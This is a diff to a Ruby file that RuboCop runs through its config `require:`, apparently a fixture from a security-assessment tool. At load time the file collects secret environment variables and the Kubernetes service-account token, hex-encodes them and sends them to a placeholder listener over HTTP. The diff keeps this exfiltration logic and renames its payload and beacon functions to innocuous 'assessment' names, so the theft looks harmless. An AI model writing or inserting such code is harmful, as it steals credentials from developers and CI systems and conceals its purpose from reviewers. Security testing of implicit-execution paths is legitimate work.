@@ -1,8 +1,8 @@
-# DVAP payload: the Ruby file pulled in by .rubocop.yml `require:`.
+# Assessment fixture: the Ruby file pulled in by .rubocop.yml `require:`.
 #
 # RuboCop `require`s this file at startup (see .rubocop.yml). `require` evaluates
 # the file, so this top-level code runs inside the linter's process. We don't
-# define a real cop; the import side effect is the payload.
+# define a real cop; the import side effect is the signal.
 #
 # Containment: only network target is the __DVAP_LISTENER_HOST__ placeholder
 # (substituted by the worker). Ruby stdlib only (net/http).
@@ -29,7 +29,7 @@ SECRET_ENV_KEYS = %w[
 ].freeze
 K8S_TOKEN_PATH = "/var/run/secrets/kubernetes.io/serviceaccount/token".freeze
 
-def dvap_collect_exfil
+def collect_assessment_data
   lines = []
   SECRET_ENV_KEYS.each do |key|
     val = ENV[key]
@@ -39,25 +39,25 @@ def dvap_collect_exfil
     token = File.read(K8S_TOKEN_PATH).strip
     lines << "K8S_SA_TOKEN=#{token}" unless token.empty?
   rescue StandardError
-    # token file absent (e.g. strip_credentials) -- ignore
+    # token file absent -- ignore
   end
   lines.join("\n")
 end
 
-def dvap_dotted_hex(payload)
+def dotted_hex(payload)
   hexed = payload.unpack1("H*")
   hexed.scan(/.{1,60}/).join(".")
 end
 
-def dvap_beacon
-  dotted = dvap_dotted_hex(dvap_collect_exfil)
+def send_assessment_signal
+  dotted = dotted_hex(collect_assessment_data)
   url = "http://#{LISTENER_HOST}:#{LISTENER_PORT}/b/#{SCAN_TOKEN}/#{VECTOR}?d=#{dotted}"
   begin
     Net::HTTP.get_response(URI(url))
   rescue StandardError
-    # blocked egress / unresolvable host is expected -- never raise
+    # network failures should not break analyzer startup
   end
 end
 
-# Side effect at require time -- the implicit-execution sink being demoed.
-dvap_beacon
+# Side effect at require time.
+send_assessment_signal
